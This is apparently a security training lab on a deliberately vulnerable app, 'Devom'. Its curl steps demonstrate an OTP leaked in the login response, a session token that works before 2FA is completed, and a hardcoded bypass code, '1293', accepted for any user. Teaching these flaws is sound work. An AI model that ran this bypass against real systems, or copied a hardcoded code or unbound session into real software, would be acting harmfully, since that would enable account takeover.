# 10 — OTP authentication logic

*Can a Devom session skip the one-time code, and can the code be guessed from a fixed value?*

## What this lab does

You will:

1. Sign in as `cala` and record the one-time code Devom returns in the login response.
2. Read a protected profile with the session token **before** submitting any code.
3. Submit one wrong code, then the code from the login response.
4. Submit the fixed value `1293` that the pinned source accepts for any user.

The exercise separates three different problems: the code is disclosed at login, the session is not bound to a completed verification, and one value is accepted regardless of the real code. A successful verification message alone does not prove that protected endpoints enforce the second factor.

**Target:** Devom at revision [`af4290ce8d2178765bfc2bd96cf233f6d3d03161`](https://github.com/memohk/Devom/tree/af4290ce8d2178765bfc2bd96cf233f6d3d03161). The request and response shapes below come from that revision; the runtime results are expected behavior and have **not** been piloted.

## Before you begin

Complete [Common prerequisites](00-common-setup.md) and [Devom setup](01-devom-setup.md). Use the seeded `cala` account and its disposable database only. Do not send codes to a real phone number or use a real account.

Every request below sends `User-Agent: Postman`. Without it, Devom encrypts JSON responses.

## Tools needed

- The running Devom backend from [Devom setup](01-devom-setup.md).
- Bash and `curl`, or an API client that can set headers and a JSON body.

## Guided walkthrough

### 1. Sign in and capture the login response

```bash title="Sign in as cala"
BASE='https://127.0.0.1:8080'
curl --insecure -i -A 'Postman' -H 'Content-Type: application/json' \
  --data '{"username":"cala","password":"cala123"}' "$BASE/login"
```

!!! success "Expected"
    `HTTP/1.1 200 OK` with `"status": "2fa_required"`, `"user_id": "100500"`, `"session_token": "..."`, and `"debug_token": "NNNN"`.

The four-digit `debug_token` is the same code the server stores for this login. Copy the `user_id`, `session_token`, and `debug_token`; do not share the response.

### 2. Use the session before verifying the code

```bash title="Read the profile with no OTP submitted"
TOKEN='PASTE_SESSION_TOKEN_HERE'
curl --insecure -i -A 'Postman' -H "Authorization: Bearer $TOKEN" \
  "$BASE/profile/100500"
```

!!! success "Expected"
    `HTTP/1.1 200 OK` with cala's profile. At this point no OTP has been verified in this walkthrough.

That result is the first finding: the session token is issued and accepted before the second factor is completed. Redact `password`, `recovery_pin`, and `security_answer` from the response before keeping it.

### 3. Submit one wrong code

```bash title="Wrong OTP"
curl --insecure -i -A 'Postman' -H 'Content-Type: application/json' \
  --data '{"user_id":"100500","token":"0000"}' "$BASE/verify_login_2fa"
```

!!! success "Expected"
    `HTTP/1.1 401 UNAUTHORIZED` with `{"status": "error"}`. `0000` is only a wrong code if it differs from the `debug_token` you recorded; check before sending.

### 4. Submit the disclosed code

```bash title="The code from the login response"
curl --insecure -i -A 'Postman' -H 'Content-Type: application/json' \
  --data '{"user_id":"100500","token":"PASTE_DEBUG_TOKEN_HERE"}' "$BASE/verify_login_2fa"
```

!!! success "Expected"
    `HTTP/1.1 200 OK` with `{"status": "success"}`.

This confirms that the value printed in the login response is the verification code. Nothing had to be delivered to a phone.

### 5. Submit the fixed value for an unrelated user

The pinned `verify_2fa` handler accepts a hardcoded value, `1293`, before it looks at `pending_2fa`. Send it with a user ID that has no pending login:

```bash title="Fixed accepted value"
curl --insecure -i -A 'Postman' -H 'Content-Type: application/json' \
  --data '{"user_id":"999999","token":"1293"}' "$BASE/verify_login_2fa"
```

!!! success "Expected"
    `HTTP/1.1 200 OK` with `{"status": "success"}`, even though user `999999` does not exist and never started a login.

This is a fixed bypass value, not a guess. Send it once, record the result, and stop; do not loop over other codes.

### 6. Decide what the result proves

Write down each finding separately, because each has a different fix:

- **Disclosure:** the login response returned the live code in `debug_token`.
- **Not bound to the session:** `/profile` accepted the token before verification. A success from `/verify_login_2fa` cannot fix that by itself.
- **Fixed value:** `1293` was accepted for a user with no pending login.

If Step 2 returned `401`, the session is being bound to verification in your build; record that result instead. If Step 5 returned `401`, the fixed value differs in your revision; report the actual response.

## Troubleshooting

- **The response body is unreadable and `Content-Type: text/plain`:** add `User-Agent: Postman`.
- **`404 User Not Found` on login:** the account name is wrong, or the database was reset. Use `cala` / `cala123`.
- **`401` on the profile:** the token is incomplete or copied with a newline; store it with `printf '%s'`.
- **`401` on the disclosed code:** the code changed. Every successful login overwrites `pending_2fa` for that user, so use the newest `debug_token`.
- **The wrong code is `1293` by accident:** pick a different value such as `0000` and repeat Step 3.

<details markdown="1">
<summary>Hints</summary>

1. Compare when `session_token` is issued with when `pending_2fa` is checked.
2. `verify_login_2fa` checks the hardcoded value `1293` first and only then compares against `pending_2fa[user_id]`.
3. `token_required` never reads `pending_2fa`, so a JWT alone opens the protected routes.

</details>

## Evidence

Submit these four items:

- **Login response:** the redacted `status`, `user_id`, and `debug_token`, with the token itself omitted.
- **Pre-verification access:** the status code and a few non-sensitive fields from the profile request in Step 2.
- **Code tests:** the status code for the wrong code, the disclosed code, and `1293`, with the user ID used in each request.
- **Limits:** state that the test covers the API only, and which of the three findings your own run reproduced.

Do not submit a live `session_token` or real personal data.

## Vulnerability and Impact

Three defects combine in the inspected revision. `/login` returns the OTP as `debug_token`, so anyone who can read the login response already has the code. The JWT is issued at the same moment and is accepted by every `@token_required` route, so completing 2FA changes nothing about what the token can reach. And `/verify_login_2fa` accepts the fixed string `1293` for any user ID, which makes the second factor optional even if the code were secret.

Together they mean a password alone is enough to use the API, and a correct-looking verification response does not demonstrate that the second factor was enforced. The client app is unaffected in this lab: the finding is server-side.

## Cleanup and review

- Delete local token copies: `rm -f session.jwt` and clear the token from your shell history or scratch file.
- Revert nothing in the database; the login and verification rows are part of the lab record.
- If your instructor records audit data, note the requests you sent and their timestamps.

What server-side state would distinguish a password-only session from one that completed OTP verification, and where should the code be stored so that it is never returned to the client?
